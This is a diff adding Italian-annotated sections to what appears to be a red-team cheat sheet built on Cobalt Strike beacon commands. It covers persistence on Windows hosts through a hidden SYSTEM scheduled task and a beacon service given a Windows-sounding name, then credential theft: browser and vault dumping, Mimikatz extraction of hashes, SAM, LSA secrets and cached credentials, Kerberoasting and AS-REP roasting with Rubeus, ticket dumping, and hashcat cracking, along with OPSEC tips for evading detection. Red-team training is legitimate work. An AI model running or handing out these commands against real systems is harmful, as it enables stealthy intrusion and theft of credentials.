@@ -602,5 +602,155 @@ kerberos::purge
 
 ```
 
+## Elevated Host Persistence
+
+```bash
+##Stessa cosa per la persistence da host, ma con i privilegi
+#Task schedulati
+#
+#
+# <Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+# <Triggers>
+#     <BootTrigger>
+#         <Enabled>true</Enabled>
+#     </BootTrigger>
+# </Triggers>
+# <Principals>
+#     <Principal>
+#         <UserId>NT AUTHORITY\SYSTEM</UserId>
+#         <RunLevel>HighestAvailable</RunLevel>
+#     </Principal>
+# </Principals>
+# <Settings>
+#     <AllowStartOnDemand>true</AllowStartOnDemand>
+#     <Enabled>true</Enabled>
+#     <Hidden>true</Hidden>
+# </Settings>
+# <Actions>
+#     <Exec>
+#         <Command>"C:\Program Files\Microsoft Update Health Tools\updater.exe"</Command>
+#     </Exec>
+# </Actions>
+# </Task>
+#
+#
+beacon> cd C:\Windows\System32
+beacon> upload C:\Payloads\beacon_x64.exe
+beacon> schtaskscreate \Beacon XML CREATE
 
 
+#Windows Service
+beacon> cd C:\Windows\System32\
+beacon> upload C:\Payloads\beacon_x64.svc.exe
+beacon> mv beacon_x64.svc.exe debug_svc.exe
+
+
+beacon> sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3
+
+```
+
+
+## Credential Access
+
+```bash
+#Leggere credenziali da Browser
+beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
+
+
+#Windows Credential Manager
+#tool Nativo
+beacon> run vaultcmd /listcreds:"Windows Credentials" /all
+
+#Seabelt
+execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
+
+
+#ShardDPAPI  
+beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
+
+#LSASS
+##OPSEC NOTE
+# Dumpare LSASS non va bene
+#Mimikatz utilizza http beacon che è più veloce
+
+#NTLM Hash
+beacon> mimikatz sekurlsa::logonpasswords   
+#che poi andrà crackato
+PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule
+
+#Kerberos Key
+beacon> mimikatz sekurlsa::ekeys
+
+#
+ .\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
+
+
+#SAM
+
+#Mimikatz
+beacon> mimikatz !lsadump::sam
+
+#LSA Secret
+beacon> mimikatz !lsadump::secrets
+
+#Cached Domain Credentials
+beacon> mimikatz !lsadump::cache
+
+#
+PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
+
+
+
+
+#Kerberos Ticket
+#OPSEC
+#Un approccio più sicuro consiste nell'utilizzare uno strumento di enumerazione per selezionare prima i potenziali obiettivi e poi arrostirli in modo più selettivo.
+
+#AS-REP Roasting
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
+#
+PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
+
+#Kerberoasting
+#Prima enumero
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
+
+#
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
+#
+PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
+
+###Esempio OPSEC
+#Enumero (questo a volte sminchia gli spn)
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
+#Passo a rubeus solo l'spn che mi interessa
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /simple /nowrap /format:hashcat
+
+#Kerberoasting
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /spn:"MSSQLSvc/sql.contoso.com:1433" /format:hashcat /simple
+
+
+
+#Estrarre i ticket
+#opsec molto meglio non tocchiamo lsass
+
+#Rubeus to triage Kerberos tickets for all users.
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+
+#ottenuto LUID con il cmando sopra dumpo il ticket
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:[LUID] /service:krbtgt /nowrap
+
+
+
+
+#Renewing TGTs
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N
+
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap
+
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N
+
+
+
+```
